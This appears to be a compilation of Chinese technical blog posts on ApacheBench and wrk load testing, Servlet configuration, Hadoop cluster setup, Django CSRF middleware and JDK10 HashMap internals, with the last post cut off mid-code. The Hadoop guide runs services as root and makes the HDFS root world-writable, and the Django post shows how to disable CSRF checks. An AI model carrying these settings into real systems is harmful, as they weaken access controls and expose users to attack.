参数说明：格式：ab [options] [http://]hostname[:port]/path-n requests Number of requests to perform     //本次测试发起的总请求数-c concurrency Number of multiple requests to make　　 //一次产生的请求数（或并发数）-t timelimit Seconds to max. wait for responses　　　　//测试所进行的最大秒数，默认没有时间限制。-r Don't exit on socket receive errors.     // 抛出异常继续执行测试任务 -p postfile File containing data to POST　　//包含了需要POST的数据的文件，文件格式如“p1=1&p2=2”.使用方法是 -p 111.txt-T content-type Content-type header for POSTing//POST数据所使用的Content-type头信息，如 -T “application/x-www-form-urlencoded” 。 （配合-p）-v verbosity How much troubleshooting info to print//设置显示信息的详细程度 – 4或更大值会显示头信息， 3或更大值可以显示响应代码(404, 200等), 2或更大值可以显示警告和其他信息。 -V 显示版本号并退出。-C attribute Add cookie, eg. -C “c1=1234,c2=2,c3=3” (repeatable)//-C cookie-name=value 对请求附加一个Cookie:行。 其典型形式是name=value的一个参数对。此参数可以重复，用逗号分割。提示：可以借助session实现原理传递 JSESSIONID参数， 实现保持会话的功能，如-C ” c1=1234,c2=2,c3=3, JSESSIONID=FF056CD16DA9D71CB131C1D56F0319F8″ 。-w Print out results in HTML tables　　//以HTML表的格式输出结果。默认时，它是白色背景的两列宽度的一张表。-i Use HEAD instead of GET-x attributes String to insert as table attributes-y attributes String to insert as tr attributes-z attributes String to insert as td or th attributes-H attribute Add Arbitrary header line, eg. ‘Accept-Encoding: gzip’ Inserted after all normal header lines. (repeatable)-A attribute Add Basic WWW Authentication, the attributesare a colon separated username and password.-P attribute Add Basic Proxy Authentication, the attributes are a colon separated username and password.-X proxy:port Proxyserver and port number to use-V Print version number and exit-k Use HTTP KeepAlive feature-d Do not show percentiles served table.-S Do not show confidence estimators and warnings.-g filename Output collected data to gnuplot format file.-e filename Output CSV file with percentages served-h Display usage information (this message)
 


性能测试报告



 
测试报告应该包含以下内容。当然，根据场景不同，可以适当增减指标，例如有的业务要求关注cpu，内存，IO等指标，此时就应该加上相关指标。

 


常见的坑


1.AB发送的是http1.0请求。
2.-t可以指定时间，-n指定发送请求总数，同时使用时压测会在-t秒或者发送了-n个请求之后停止。但是-t一定要在-n之前（ab的bug，-n在-t之前最多只会跑5s）。
3.为了使测试结果更可靠，单次压测时间应在2分钟以上。
理论上，压测时间越长，结果误差越小。同时，可以在瓶颈附近进行长时间压测，例如一个小时或者一天，可以用来测试系统稳定性。许多系统的bug都是在持续压力下才会暴露出来。
4.小心压测客户端成为瓶颈。
例如上传，下载接口的压测，此时压测客户端的网络上行，下行速度都会有瓶颈，千万小心服务器还没到达瓶颈时，客户端先到了瓶颈。此时，可以利用多客户端同时压测。
5.ab可以将参数写入文件中，用此种方式可以测试上传文件的接口。
 需要配合-p -t 使用。
 
$ ab -n 10000 -c 8 -p post_image_1k.txt -T "multipart/form-data; boundary=1234567890" http://xxxxxxx
 
文件内容如下：


 
6.ab不支持动态构建请求参数，wrk可配合lua脚本支持动态构建请求参数，还是比较牛的。
package.path = '/root/wrk/?.lua;'local md5 = require "md5"local body   = [[BI_login|userid{145030}|openid{4-22761563}|source{}|affiliate{}|creative{}|family{}|genus{0}|ip{180.111.151.116}|from_uid{0}|login_date{2016-11-04}|login_time{10:40:13}|extra{}|srcid{1}|snid{1002}|clientid{1253}|gameid{2100012}BI_logout|userid{184103}|openid{4-22784181}|family{}|genus{0}|ip{218.2.96.82}|logout_date{2016-11-04}|logout_time{10:40:42}|extra{}|srcid{1}|snid{1002}|clientid{1253}|gameid{2100012}BI_role_logout|roleid{184103}|userid{184103}|openid{4-22784181}|ip{218.2.96.82}|level{100}|money{468}|power{1}|exp{252}|lijin{0}|online_time{0}|mapid{0}|posx{0}|posy{0}|rolelogout_date{2016-11-04}|rolelogout_time{10:40:42}|extra{0}|srcid{0}|snid{1002}|clientid{1253}|gameid{2100012}BI_logout|userid{71084}|openid{4-20974629}|family{}|genus{0}|ip{117.136.8.76}|logout_date{2016-11-04}|logout_time{10:40:43}|extra{}|srcid{1}|snid{1002}|clientid{1253}|gameid{2100012}]] --local body = "hello"wrk.headers["Content-Type"] = "text/xml"local i=0request = function()   i = i+1   local path = "/v1/pub?gameid=510038&timestamp=%s&key=510038&type=basic&sign=%s"   local time = os.time()*1000   local v = "510038" .. time .. "basic98889999"   local sign = md5.sumhexa(v)   path = string.format(path, time, sign)   --print(path)   return wrk.format("POST", path, nil, body)end
 

 

 
腾讯WeTest推出的“压测大师”，一分钟完成用例配置，无需维护测试环境，支持http协议、API接口、网站等主流压测场景。
点击：https://wetest.qq.com/gaps 即可体验。
 
如果使用当中有任何疑问，欢迎联系腾讯WeTest企业QQ：2852350015。
********************************************************************************************************************************************************************************************************
06-码蚁JavaWeb之Servlet生命周期与基本配置
学习地址:[撩课-JavaWeb系列1之基础语法-前端基础][撩课-JavaWeb系列2之XML][撩课-JavaWeb系列3之MySQL][撩课-JavaWeb系列4之JDBC][撩课-JavaWeb系列5之web服务器-idea]
 

Servlet生命周期

Servlet什么时候被创建
1.默认情况下第一次访问的时候创建
2.可以通过配置文件设置服务器启动的时候就创建





`init()`
    servlet对象创建的时候调用
    默认第一次访问时创建
`service()`
    每次请求都会执行一次
`destroy()`
    servlet对象销毁的时候执行
    默认服务器关闭时销毁
`load-on-startup配置`
    对象在服务器启动时就创建
    值为数字代表优先级
    数据越小，优先级越高，不能为负数


Servlet配置信息

初始化参数

<init-params>
    <init-name>名称</init-name>
    <init-value>值</init-value>
    config参数
        该servlert的配置信息
        获得web.xml当中参数
        初始化参数
        获取servletContext对象

url-patten
1.完全匹配
        
2.目录匹配
        
3.扩展名匹配

缺省Servlet
访问的资源不存在时，就会找缺省的地址
<url-patten>/</url-patten>]

全局Web.xml
对于部署在服务器上的所有应用都有效
先到自己工程当中找web.xml配置
再到全局web.xml当中去找配置
如果两个当中有相同的配置
自己当中配置的内容会生效

静态资源加载过程
在path后面写的静态资源名称index.html
或者是其它的.html
它都是会找ur-patten当中
有没有匹配的内容

如果有，就加载对应的servlet
如果没有
就到自己配置当中
找缺省的url-patten

如果自己配置文件当中
没有缺省的
就会找全局配置缺省的url-patten

在全局配置当中
有一个缺省的url-patten 
对应的是default的Servlet
defaultServlet内部
会到当前访问的工程根目录当中
去找对应的名称的静态资源

如果有，
就把里面的内容逐行读出。
响应给浏览器。
如果没有，就会报404错误

欢迎页面
Welcome-file-list
不写任何资源名称的时候，会访问欢迎页面
默认从上往下找



配套 博文 视频 讲解 点击以下链接查看
https://study.163.com/course/courseMain.htm?courseId=1005981003&share=2&shareId=1028240359




********************************************************************************************************************************************************************************************************
Centos7 搭建 hadoop3.1.1 集群教程
 


配置环境要求：



Centos7
jdk 8
Vmware 14 pro
hadoop 3.1.1


Hadoop下载






安装4台虚拟机，如图所示







克隆之后需要更改网卡选项，ip，mac地址，uuid


 

重启网卡:
 


为了方便使用，操作时使用的root账户




 设置机器名称






再使用hostname命令，观察是否更改
类似的，更改其他三台机器hdp-02、hdp-03、hdp-04。



在任意一台机器Centos7上修改域名映射
vi /etc/hosts
修改如下

使用scp命令发送其他克隆机上    scp /etc/hosts 192.168.126.124:/etc/



给四台机器生成密钥文件



 确认生成。
把每一台机器的密钥都发送到hdp-01上（包括自己）
将所有密钥都复制到每一台机器上



在每一台机器上测试



无需密码则成功，保证四台机器之间可以免密登录



安装Hadoop



在usr目录下创建Hadoop目录，以保证Hadoop生态圈在该目录下。
使用xsell+xFTP传输文

解压缩Hadoop



配置java与hadoop环境变量


1 export JAVA_HOME=/usr/jdk/jdk1.8.0_131
2 export JRE_HOME=${JAVA_HOME}/jre
3 export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib
4 export PATH=${JAVA_HOME}/bin:$PATH
5 
6 export HADOOP_HOME=/usr/hadoop/hadoop-3.1.1/
7 export PATH=$PATH:$JAVA_HOME/bin:$HADOOP_HOME/bin:$HADOOP_HOME/sbin

注意：以上四台机器都需要配置环境变量


修改etc/hadoop中的配置文件
注：除了个别提示，其余文件只用修改hdp-01中的即可



修改core-site.xml 

 1 <configuration>
 2 <property>
 3 <name>fs.defaultFS</name>
 4 <value>hdfs://hdp-01:9000</value>
 5 </property>
 6  <property>
 7   <name>hadoop.tmp.dir</name>
 8     <!-- 以下为存放临时文件的路径 -->
 9   <value>/opt/hadoop/hadoop-3.1.1/data/tmp</value>
10  </property>
11 </configuration>

 


修改hadoop-env.sh

1 export JAVA_HOME=/usr/jdk/jdk1.8.0_131

 
注：该步骤需要四台都配置


修改hdfs-site.xml

 1 <configuration>
 2 <property>
 3   <name>dfs.namenode.http-address</name>
 4  <!-- hserver1 修改为你的机器名或者ip -->
 5   <value>hdp-01:50070</value>
 6  </property>
 7  <property>
 8   <name>dfs.namenode.name.dir</name>
 9   <value>/hadoop/name</value>
10  </property>
11  <property>
12   <name>dfs.replication</name>
13    <!-- 备份次数 -->
14   <value>1</value>
15  </property>
16  <property>
17   <name>dfs.datanode.data.dir</name>
18   <value>/hadoop/data</value>
19  </property>
20 
21 
22 </configuration>

 


 修改mapred-site.xml

1 <configuration>
2 <property>
3 <name>mapreduce.framework.name</name>
4 <value>yarn</value>
5 </property>
6 </configuration>



修改 workers

1 hdp-01
2 hdp-02
3 hdp-03
4 hdp-04



 修改yarn-site.xml文件

 1 <configuration>
 2 
 3 <!-- Site specific YARN configuration properties -->
 4 <property>
 5 <name>yarn.resourcemanager.hostname</name>
 6  <value>hdp-01</value>
 7 </property>
 8 <property>
 9  <name>yarn.nodemanager.aux-services</name>
10   <value>mapreduce_shuffle</value>
11 </property>
12  <property>
13   <name>yarn.nodemanager.aux-services.mapreduce.shuffle.class</name>
14 <value>org.apache.hadoop.mapred.ShuffleHandler</value>
15 </property>
16 <property>
17  <name>yarn.nodemanager.resource.cpu-vcores</name>
18  <value>1</value>
19 </property>
20 
21 </configuration>

注：可以把整个/usr/hadoop目录所有文件复制到其余三个机器上 还是通过scp 嫌麻烦的可以先整一台机器，然后再克隆




启动Hadoop




在namenode上初始化
因为hdp-01是namenode，hdp-02、hdp=03和hdp-04都是datanode，所以只需要对hdp-01进行初始化操作，也就是对hdfs进行格式化。
 执行初始化脚本，也就是执行命令：hdfs namenode  -format
等待一会后，不报错返回 “Exiting with status 0” 为成功，“Exiting with status 1”为失败
 


在namenode上执行启动命令
直接执行start-all.sh 观察是否报错，如报错执行一下内容
$ vim sbin/start-dfs.sh
$ vim sbin/stop-dfs.sh
在空白位置加入

1 HDFS_DATANODE_USER=root
2 
3 HADOOP_SECURE_DN_USER=hdfs
4 
5 HDFS_NAMENODE_USER=root
6 
7 HDFS_SECONDARYNAMENODE_USER=root

 
 
$ vim sbin/start-yarn.sh 
$ vim sbin/stop-yarn.sh 
在空白位置加入

1 YARN_RESOURCEMANAGER_USER=root
2 
3 HADOOP_SECURE_DN_USER=yarn
4 
5 YARN_NODEMANAGER_USER=root

 
 
$ vim start-all.sh
$ vim stop-all.sh

1 TANODE_USER=root
2 HDFS_DATANODE_SECURE_USER=hdfs
3 HDFS_NAMENODE_USER=root
4 HDFS_SECONDARYNAMENODE_USER=root
5 YARN_RESOURCEMANAGER_USER=root
6 HADOOP_SECURE_DN_USER=yarn
7 YARN_NODEMANAGER_USER=root

 
配置完毕后执行start-all.sh

运行jps

显示6个进程说明配置成功

去浏览器检测一下  http://hdp-01:50070

创建目录 上传不成功需要授权

hdfs dfs -chmod -R a+wr hdfs://hdp-01:9000/

 



//查看容量hadoop fs -df -h /


 

查看各个机器状态报告

hadoop dfsadmin -report




 


********************************************************************************************************************************************************************************************************
详解Django的CSRF认证
1.csrf原理
csrf要求发送post,put或delete请求的时候，是先以get方式发送请求，服务端响应时会分配一个随机字符串给客户端，客户端第二次发送post,put或delete请求时携带上次分配的随机字符串到服务端进行校验
2.Django中的CSRF中间件
首先，我们知道Django中间件作用于整个项目。
在一个项目中，如果想对全局所有视图函数或视图类起作用时，就可以在中间件中实现，比如想实现用户登录判断，基于用户的权限管理（RBAC）等都可以在Django中间件中来进行操作
Django内置了很多中间件,其中之一就是CSRF中间件
MIDDLEWARE_CLASSES = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.auth.middleware.SessionAuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]
上面第四个就是Django内置的CSRF中间件
3.Django中间件的执行流程
Django中间件中最多可以定义5个方法
process_request
process_response
process_view
process_exception
process_template_response
Django中间件的执行顺序
1.请求进入到Django后，会按中间件的注册顺序执行每个中间件中的process_request方法
    如果所有的中间件的process_request方法都没有定义return语句，则进入路由映射，进行url匹配
    否则直接执行return语句，返回响应给客户端
2.依次按顺序执行中间件中的process_view方法
    如果某个中间件的process_view方法没有return语句，则根据第1步中匹配到的URL执行对应的视图函数或视图类
    如果某个中间件的process_view方法中定义了return语句，则后面的视图函数或视图类不会执行,程序会直接返回
3.视图函数或视图类执行完成之后，会按照中间件的注册顺序逆序执行中间件中的process_response方法
    如果中间件中定义了return语句，程序会正常执行，把视图函数或视图类的执行结果返回给客户端
    否则程序会抛出异常
4.程序在视图函数或视图类的正常执行过程中
    如果出现异常，则会执行按顺序执行中间件中的process_exception方法
    否则process_exception方法不会执行
    如果某个中间件的process_exception方法中定义了return语句，则后面的中间件中的process_exception方法不会继续执行了
5.如果视图函数或视图类中使用render方法来向客户端返回数据，则会触发中间件中的process_template_response方法
4.Django CSRF中间件的源码解析
Django CSRF中间件的源码
class CsrfViewMiddleware(MiddlewareMixin):

    def _accept(self, request):
        request.csrf_processing_done = True
        return None

    def _reject(self, request, reason):
        logger.warning(
            'Forbidden (%s): %s', reason, request.path,
            extra={
                'status_code': 403,
                'request': request,
            }
        )
        return _get_failure_view()(request, reason=reason)

    def _get_token(self, request):
        if settings.CSRF_USE_SESSIONS:
            try:
                return request.session.get(CSRF_SESSION_KEY)
            except AttributeError:
                raise ImproperlyConfigured(
                    'CSRF_USE_SESSIONS is enabled, but request.session is not '
                    'set. SessionMiddleware must appear before CsrfViewMiddleware '
                    'in MIDDLEWARE%s.' % ('_CLASSES' if settings.MIDDLEWARE is None else '')
                )
        else:
            try:
                cookie_token = request.COOKIES[settings.CSRF_COOKIE_NAME]
            except KeyError:
                return None

            csrf_token = _sanitize_token(cookie_token)
            if csrf_token != cookie_token:
                # Cookie token needed to be replaced;
                # the cookie needs to be reset.
                request.csrf_cookie_needs_reset = True
            return csrf_token

    def _set_token(self, request, response):
        if settings.CSRF_USE_SESSIONS:
            request.session[CSRF_SESSION_KEY] = request.META['CSRF_COOKIE']
        else:
            response.set_cookie(
                settings.CSRF_COOKIE_NAME,
                request.META['CSRF_COOKIE'],
                max_age=settings.CSRF_COOKIE_AGE,
                domain=settings.CSRF_COOKIE_DOMAIN,
                path=settings.CSRF_COOKIE_PATH,
                secure=settings.CSRF_COOKIE_SECURE,
                httponly=settings.CSRF_COOKIE_HTTPONLY,
            )
            patch_vary_headers(response, ('Cookie',))

    def process_request(self, request):
        csrf_token = self._get_token(request)
        if csrf_token is not None:
            # Use same token next time.
            request.META['CSRF_COOKIE'] = csrf_token

    def process_view(self, request, callback, callback_args, callback_kwargs):
        if getattr(request, 'csrf_processing_done', False):
            return None

        if getattr(callback, 'csrf_exempt', False):
            return None

        if request.method not in ('GET', 'HEAD', 'OPTIONS', 'TRACE'):
            if getattr(request, '_dont_enforce_csrf_checks', False):
                return self._accept(request)

            if request.is_secure():
                referer = force_text(
                    request.META.get('HTTP_REFERER'),
                    strings_only=True,
                    errors='replace'
                )
                if referer is None:
                    return self._reject(request, REASON_NO_REFERER)

                referer = urlparse(referer)

                if '' in (referer.scheme, referer.netloc):
                    return self._reject(request, REASON_MALFORMED_REFERER)

                if referer.scheme != 'https':
                    return self._reject(request, REASON_INSECURE_REFERER)

                good_referer = (
                    settings.SESSION_COOKIE_DOMAIN
                    if settings.CSRF_USE_SESSIONS
                    else settings.CSRF_COOKIE_DOMAIN
                )
                if good_referer is not None:
                    server_port = request.get_port()
                    if server_port not in ('443', '80'):
                        good_referer = '%s:%s' % (good_referer, server_port)
                else:
                    good_referer = request.get_host()

                good_hosts = list(settings.CSRF_TRUSTED_ORIGINS)
                good_hosts.append(good_referer)

                if not any(is_same_domain(referer.netloc, host) for host in good_hosts):
                    reason = REASON_BAD_REFERER % referer.geturl()
                    return self._reject(request, reason)

            csrf_token = request.META.get('CSRF_COOKIE')
            if csrf_token is None:
                return self._reject(request, REASON_NO_CSRF_COOKIE)

            request_csrf_token = ""
            if request.method == "POST":
                try:
                    request_csrf_token = request.POST.get('csrfmiddlewaretoken', '')
                except IOError:
                    pass

            if request_csrf_token == "":
                request_csrf_token = request.META.get(settings.CSRF_HEADER_NAME, '')

            request_csrf_token = _sanitize_token(request_csrf_token)
            if not _compare_salted_tokens(request_csrf_token, csrf_token):
                return self._reject(request, REASON_BAD_TOKEN)

        return self._accept(request)

    def process_response(self, request, response):
        if not getattr(request, 'csrf_cookie_needs_reset', False):
            if getattr(response, 'csrf_cookie_set', False):
                return response

        if not request.META.get("CSRF_COOKIE_USED", False):
            return response

        self._set_token(request, response)
        response.csrf_cookie_set = True
        return response
从上面的源码中可以看到，CsrfViewMiddleware中间件中定义了process_request，process_view和process_response三个方法
先来看process_request方法
def _get_token(self, request):  
    if settings.CSRF_USE_SESSIONS:  
        try:  
            return request.session.get(CSRF_SESSION_KEY)  
        except AttributeError:  
            raise ImproperlyConfigured(  
                'CSRF_USE_SESSIONS is enabled, but request.session is not '  
 'set. SessionMiddleware must appear before CsrfViewMiddleware ' 'in MIDDLEWARE%s.' % ('_CLASSES' if settings.MIDDLEWARE is None else '')  
            )  
    else:  
        try:  
            cookie_token = request.COOKIES[settings.CSRF_COOKIE_NAME]  
        except KeyError:  
            return None  
  
  csrf_token = _sanitize_token(cookie_token)  
        if csrf_token != cookie_token:  
            # Cookie token needed to be replaced;  
 # the cookie needs to be reset.  request.csrf_cookie_needs_reset = True  
 return csrf_token

def process_request(self, request):  
        csrf_token = self._get_token(request)  
        if csrf_token is not None:  
            # Use same token next time.  
      request.META['CSRF_COOKIE'] = csrf_token
从Django项目配置文件夹中读取CSRF_USE_SESSIONS的值，如果获取成功，则从session中读取CSRF_SESSION_KEY的值，默认为'_csrftoken'，如果没有获取到CSRF_USE_SESSIONS的值，则从发送过来的请求中获取CSRF_COOKIE_NAME的值，如果没有定义则返回None。
再来看process_view方法
在process_view方法中，先检查视图函数是否被csrf_exempt装饰器装饰，如果视图函数没有被csrf_exempt装饰器装饰，则程序继续执行，否则返回None。接着从request请求头中或者cookie中获取携带的token并进行验证，验证通过才会继续执行与URL匹配的视图函数，否则就返回403 Forbidden错误。
实际项目中，会在发送POST,PUT,DELETE,PATCH请求时，在提交的form表单中添加
{% csrf_token %}
即可，否则会出现403的错误

5.csrf_exempt装饰器和csrf_protect装饰器
5.1 基于Django FBV
在一个项目中，如果注册起用了CsrfViewMiddleware中间件，则项目中所有的视图函数和视图类在执行过程中都要进行CSRF验证。
此时想使某个视图函数或视图类不进行CSRF验证，则可以使用csrf_exempt装饰器装饰不想进行CSRF验证的视图函数
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt  
def index(request):  
    pass
也可以把csrf_exempt装饰器直接加在URL路由映射中，使某个视图函数不经过CSRF验证
from django.views.decorators.csrf import csrf_exempt  
  
from users import views  
 
urlpatterns = [  
    url(r'^admin/', admin.site.urls),  
    url(r'^index/',csrf_exempt(views.index)),  
]
同样的，如果在一个Django项目中，没有注册起用CsrfViewMiddleware中间件，但是想让某个视图函数进行CSRF验证，则可以使用csrf_protect装饰器
csrf_protect装饰器的用法跟csrf_exempt装饰器用法相同，都可以加上视图函数上方装饰视图函数或者在URL路由映射中直接装饰视图函数
from django.views.decorators.csrf import csrf_exempt  

@csrf_protect  
def index(request):  
    pass
或者
from django.views.decorators.csrf import csrf_protect  
  
from users import views  
 
urlpatterns = [  
    url(r'^admin/', admin.site.urls),  
    url(r'^index/',csrf_protect(views.index)),  
]
5.1 基于Django CBV
上面的情况是基于Django FBV的，如果是基于Django CBV，则不可以直接加在视图类的视图函数中了
此时有三种方式来对Django CBV进行CSRF验证或者不进行CSRF验证
方法一，在视图类中定义dispatch方法，为dispatch方法加csrf_exempt装饰器
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator

class UserAuthView(View):

    @method_decorator(csrf_exempt)
    def dispatch(self, request, *args, **kwargs):
        return super(UserAuthView,self).dispatch(request,*args,**kwargs)

    def get(self,request,*args,**kwargs):
        pass

    def post(self,request,*args,**kwargs):
        pass

    def put(self,request,*args,**kwargs):
        pass

    def delete(self,request,*args,**kwargs):
        pass
方法二：为视图类上方添加装饰器
@method_decorator(csrf_exempt,name='dispatch')
class UserAuthView(View):
    def get(self,request,*args,**kwargs):
        pass

    def post(self,request,*args,**kwargs):
        pass

    def put(self,request,*args,**kwargs):
        pass

    def delete(self,request,*args,**kwargs):
        pass
方式三：在url.py中为类添加装饰器
from django.views.decorators.csrf import csrf_exempt

urlpatterns = [
    url(r'^admin/', admin.site.urls),
    url(r'^auth/', csrf_exempt(views.UserAuthView.as_view())),
]

csrf_protect装饰器的用法跟上面一样


********************************************************************************************************************************************************************************************************
JDK10源码分析之HashMap
HashMap在工作中大量使用，但是具体原理和实现是如何的呢？技术细节是什么？带着很多疑问，我们来看下JDK10源码吧。
1、数据结构
　　采用Node<K,V>[]数组，其中，Node<K,V>这个类实现Map.Entry<K,V>，是一个链表结构的对象，并且在一定条件下，会将链表结构变为红黑树。所以，JDK10采用的是数组+链表+红黑树的数据结构。贴上Node的源码

 static class Node<K,V> implements Map.Entry<K,V> {
        final int hash;
        final K key;
        V value;
        Node<K,V> next;

        Node(int hash, K key, V value, Node<K,V> next) {
            this.hash = hash;
            this.key = key;
            this.value = value;
            this.next = next;
        }

        public final K getKey()        { return key; }
        public final V getValue()      { return value; }
        public final String toString() { return key + "=" + value; }

        public final int hashCode() {
            return Objects.hashCode(key) ^ Objects.hashCode(value);
        }

        public final V setValue(V newValue) {
            V oldValue = value;
            value = newValue;
            return oldValue;
        }

        public final boolean equals(Object o) {
            if (o == this)
                return true;
            if (o instanceof Map.Entry) {
                Map.Entry<?,?> e = (Map.Entry<?,?>)o;
                if (Objects.equals(key, e.getKey()) &&
                    Objects.equals(value, e.getValue()))
                    return true;
            }
            return false;
        }
    }

 
2、静态变量（默认值）

DEFAULT_INITIAL_CAPACITY= 1 << 4：初始化数组默认长度。1左移4位，为16。
MAXIMUM_CAPACITY = 1 << 30：初始化默认容量大小，2的30次方。
DEFAULT_LOAD_FACTOR = 0.75f：负载因子，用于和数组长度相乘，当数组长度大于得到的值后，会进行数组的扩容，扩容倍数是2^n。
TREEIFY_THRESHOLD = 8：链表长度达到该值后，会进行数据结构转换，变成红黑树，优化速率。
UNTREEIFY_THRESHOLD = 6：红黑树的数量小于6时，在resize中，会转换成链表。

3、构造函数

 /**
     * Constructs an empty {@code HashMap} with the specified initial
     * capacity and load factor.
     *
     * @param  initialCapacity the initial capacity
     * @param  loadFactor      the load factor
     * @throws IllegalArgumentException if the initial capacity is negative
     *         or the load factor is nonpositive
     */
    public HashMap(int initialCapacity, float loadFactor) {
        if (initialCapacity < 0)
            throw new IllegalArgumentException("Illegal initial capacity: " +
                                               initialCapacity);
        if (initialCapacity > MAXIMUM_CAPACITY)
            initialCapacity = MAXIMUM_CAPACITY;
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new IllegalArgumentException("Illegal load factor: " +
                                               loadFactor);
        this.loadFactor = loadFactor;
        this.threshold = tableSizeFor(initialCapacity);
    }

    /**
     * Constructs an empty {@code HashMap} with the specified initial
     * capacity and the default load factor (0.75).
     *
     * @param  initialCapacity the initial capacity.
     * @throws IllegalArgumentException if the initial capacity is negative.
     */
    public HashMap(int initialCapacity) {
        this(initialCapacity, DEFAULT_LOAD_FACTOR);
    }

    /**
     * Constructs an empty {@code HashMap} with the default initial capacity
     * (16) and the default load factor (0.75).
     */
    public HashMap() {
        this.loadFactor = DEFAULT_LOAD_FACTOR; // all other fields defaulted
    }

    /**
     * Constructs a new {@code HashMap} with the same mappings as the
     * specified {@code Map}.  The {@code HashMap} is created with
     * default load factor (0.75) and an initial capacity sufficient to
     * hold the mappings in the specified {@code Map}.
     *
     * @param   m the map whose mappings are to be placed in this map
     * @throws  NullPointerException if the specified map is null
     */
    public HashMap(Map<? extends K, ? extends V> m) {
        this.loadFactor = DEFAULT_LOAD_FACTOR;
        putMapEntries(m, false);
    }

　　四个构造函数，这里不细说，主要说明一下一个方法。
　　1、tableSizeFor(initialCapacity)
　　
　　

  static final int tableSizeFor(int cap) {
        int n = cap - 1;
        n |= n >>> 1;
        n |= n >>> 2;
        n |= n >>> 4;
        n |= n >>> 8;
        n |= n >>> 16;
        return (n < 0) ? 1 : (n >= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;
    }

　　这个方法返回一个2^n的值，用于初始化数组的大小，可以看到，入参的数值不是实际的数组长度，是经过计算得来的大于该值的第一个2^n值，并且，计算后大于2^30时，直接返回2^30。来说明下这个算法的原理，为什么会返回2^n。至于返回2^n有什么用，后面会有说明。
　　为什么会得到2^n，举个例子。比如13。13的2进制是0000 1101，上面运算相当于以下算式。
　　0000 1101        右移一位  0000 0110 ，取或0000 1111  一直运算下去，最后+1，确实是2^n。
　　下面，由于是取或，我们现在只关心二进制最高位的1，后面不管是1或0，都先不看，我们来看以下运算。
　　000...  1 ...  右移一位与原值取或后，得到 000... 11 ...
　　000... 11 ... 右移两位与原值取或后，得到 000... 11 11 ...
　　000... 1111 ... 右移四位与原值取或后，得到 000... 1111 1111 ...
　　以此下去，在32位范围内的值，通过这样移动后，相当于用最高位的1，将之后的所有值，都补为1，得到一个2^n-1的值。最后+1自然是2^n。
4、主要方法

put(K key, V value)

  final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                   boolean evict) {
        Node<K,V>[] tab; Node<K,V> p; int n, i;
        if ((tab = table) == null || (n = tab.length) == 0)
           //如果数组未初始化，则初始化数组长度
            n = (tab = resize()).length;
       //计算key的hash值，落在数组的哪一个区间，如果不存在则新建Node元素
        if ((p = tab[i = (n - 1) & hash]) == null)
            tab[i] = newNode(hash, key, value, null);
        else {
            Node<K,V> e; K k;
            //数组存在的情况下，判断key是否已有，如果存在，则返回该值
            if (p.hash == hash &&
                ((k = p.key) == key || (key != null && key.equals(k))))
                e = p;
           //如果p是红黑树，则直接加入红黑树中
            else if (p instanceof TreeNode)
                e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);
            else {
                //如果不是红黑树，则遍历链表
                for (int binCount = 0; ; ++binCount) {
                   //如果p的next（链表中的下一个值）为空，则直接追加在该值后面
                    if ((e = p.next) == null) {
                        p.next = newNode(hash, key, value, null);
                       //如果该链表存完之后，长度大于8，则转换为红黑树
                        if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st
                            treeifyBin(tab, hash);
                        break;
                    }
                    //如果next不为空，则比较该链表节点时候就是存入的key，如果是，直接返回
                    if (e.hash == hash &&
                        ((k = e.key) == key || (key != null && key.equals(k))))
                        break;
                    p = e;
                }
            }
            //如果存在相同的key，则直接返回该值。
            if (e != null) { // existing mapping for key
                V oldValue = e.value;
                if (!onlyIfAbsent || oldValue == null)
                    e.value = value;
                afterNodeAccess(e);
                return oldValue;
            }
        }
        ++modCount;
        //数组中元素个数如果大于数组容量*负载因子，则触发数组resize操作。
        if (++size > threshold)
            resize();
        afterNodeInsertion(evict);
        return null;
    }

 
HashMap，hash是散列算法，所以HashMap中，主要也用了散列的原理。就是将数据通过hash的散列算法计算其分布情况，存入map中。上面是put的代码，可以看出主要的流程是：初始化一个Node数组，长度为2^n，计算key值落在数组的位置，如果该位置没有Node元素，则用该key建立一个Node插入，如果存在hash碰撞，即不同key计算后的值落在了同一位置，则将该值存到Node链表中。其余具体细节，在上面源码中已经标注。

hash(key)

　　计算put的hash入参，源码如下：

 static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }

　　可以看到，用到了key的hashCode方法，这个不细说，主要是计算key的散列值。主要讲一下后面为什么要和h右移16后相异或。实际上，是为了让这个hashCode的二进制值的1分布更散列一些。因为后面的运算需要，需要这样做（为什么后面的运算需要让1分散，这个我们下面会讲）。下面我们来看，为什么这样运算后，会增加1的散列性。可以看到，16位以内的二进制hashCode和它右移16位后取异或得到的值是一样的。我们举例时，用8位二进制和它右移4位取异或来举例，
比如          1101 1000 0001 0101，
右移8位为 0000 0000 1101 1000，
取异或后   1101 1000 1100 1101，可以看到1的分布更均匀了一些。
举个极端点的例子  1000 0000 0000 0000
右移8为                  0000 0000 1000 0000
取异或后                1000 0000 1000 0000，可以明显看到，1多了一个。所以这样运算是有一定效果的，使hash碰撞的几率要低了一些。
　　3. resize()
　　该方法在数组初始化，数组扩容，转换红黑树（treeifyBin中，if (tab == null || (n = tab.length) < MIN_TREEIFY_CAPACITY) resize();）中会触发。主要用于数组长度的扩展2倍，和数据的重新分布。源码如下
　　
　　

  final Node<K,V>[] resize() {
        Node<K,V>[] oldTab = table;
        int oldCap = (oldTab == null) ? 0 : oldTab.length;
        int oldThr = threshold;
        int newCap, newThr = 0;
        if (oldCap > 0) {
            //如果原数组存在，且大于2^30，则设置数组长度为0x7fffffff
            if (oldCap >= MAXIMUM_CAPACITY) {
                threshold = Integer.MAX_VALUE;
                return oldTab;
            }
            //如果原数组存在，则将其长度扩展为2倍。
            else if ((newCap = oldCap << 1) < MAXIMUM_CAPACITY &&
